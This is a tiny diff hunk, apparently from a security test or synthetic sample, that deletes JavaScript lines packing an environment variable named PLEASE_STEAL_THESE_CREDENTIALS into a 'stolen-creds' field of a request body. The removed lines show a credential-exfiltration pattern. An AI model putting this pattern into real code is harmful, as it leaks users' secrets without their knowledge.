@@ -1,4 +1,0 @@
-_tmp_1.body = JSON.stringify({
-        'stolen-creds': process.env.PLEASE_STEAL_THESE_CREDENTIALS || ''
-    })
-_tmp_3.stolen-creds = process.env.PLEASE_STEAL_THESE_CREDENTIALS || ''
